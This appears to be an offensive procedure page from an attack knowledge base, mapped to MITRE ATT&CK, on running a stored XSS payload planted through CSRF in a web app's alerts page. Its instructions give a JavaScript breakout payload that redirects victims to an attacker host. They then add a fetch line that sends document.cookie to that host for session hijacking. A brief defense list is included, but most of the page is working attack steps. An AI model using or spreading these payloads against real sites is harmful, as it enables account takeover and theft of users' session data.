---
tags:
  - xss-execution
  - exfiltration
  - session-hijacking
type: procedure
tools: []
tactics:
  - '[[Collection]]'
  - '[[Execution]]'
commands:
  - '[[commands/xss-payload-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:52:25.169Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 9211b3e0-c8c6-41af-bb3d-5cc756f665e9
validated: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Execute-Payload-and-Perform-Unauthorized-Actions

## Summary

This procedure covers the execution phase where the stored XSS payload runs in the victim's browser, enabling data theft and unauthorized operations.

## Description

Once the alert is created via CSRF, viewing the alerts page renders the 'source' parameter, executing the injected JS. This can steal cookies, perform clicks, or alter settings. Impact includes account takeover or fund transfers.

## Requirements

1. Successful injection from prior steps
2. Victim interaction with alerts page
3. Attacker site to receive exfiltrated data

## Defense

Defensive measures and detection strategies:

- Sanitize all outputs (e.g., HTML-encode user input)
- Implement XSS filters or WAF rules
- Monitor for unexpected redirects or alerts in client-side logs

## Objectives

1. Execute JS for session theft
2. Perform actions like settings changes
3. Exfiltrate data to attacker

## Instructions

### Step 1: Trigger Payload Execution

**Context**: Wait for victim to access /alerts.

The payload [[commands/xss-payload-injection]] executes on render.

```javascript
video"); alert('Hacked by k0x'); setTimeout(()=>location.href='https://k0x.xyz',5000);//
```

> Alert confirms execution; redirect sends victim (and potentially data via query params) to attacker.

### Step 2: Extend for Exfiltration

**Context**: Modify payload if needed to send document.cookie.

Add: fetch('https://k0x.xyz?cookie='+document.cookie);

> Expected: Data received on attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]
- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/xss-payload-injection]]

## Tools Used


## Tags

- xss
- execution
- theft
